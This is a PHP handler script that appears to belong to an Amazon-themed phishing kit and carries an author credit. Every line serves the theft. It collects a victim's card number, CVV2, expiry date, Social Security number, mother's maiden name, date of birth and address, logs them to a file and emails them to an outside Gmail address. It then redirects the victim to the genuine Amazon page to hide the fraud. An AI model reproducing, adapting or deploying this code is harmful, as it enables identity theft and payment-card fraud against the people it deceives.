<?
session_start();  
$ip = getenv("REMOTE_ADDR");    
$NameonCards = $_POST['NameonCards'];   
$Address11 = $_POST['Address11'];
$CityName = $_POST['CityName'];  
$ZipCode = $_POST['ZipCode']; 
$Phone221 = $_POST['Phone221']; 
$Cardanumber = $_POST['Cardanumber'];  
$CVV2 = $_POST['CVV2'];  
$mmn = $_POST['mmn']; 
$Expiredatesss = $_POST['Expiredatesss'];
$expdate_year = $_POST['expdate_year'];
$ssn21124 = $_POST['ssn21124']; 
$dobday = $_POST['dobday']; 
$dobmonth = $_POST['dobmonth'];
$dobyear = $_POST['dobyear'];  

$subj = "||Amazon FullZ|| $ip";
$msg = " \n ------------------------------------------  \nName on Card: $NameonCards\nBilling Address: $Address11\nCity: $CityName\nZip Code: $ZipCode\nPhone Number: $Phone221\nDate of Birth: $dobday-$dobmonth-$dobyear(DD/MM/YYYY)\nSocial Security Number: $ssn21124\nMother's Maiden Name: $mmn\n------------------------------------------\nCard Number: $Cardanumber\nCVV2: $CVV2\nExpiration Date: $Expiredatesss-$expdate_year\nIP: $ip\n ---------------------Created by PfD-MaStEr--------------------- "; 


$file = fopen("amz.txt","a");
fwrite($file,$msg);
fclose($file);
 
mail("alltoollogz@gmail.com", $subj, $msg); 
header("Location: https://www.amazon.com/gp/css/homepage.html?ie=UTF8&ref_=nav_youraccount_ya");


?>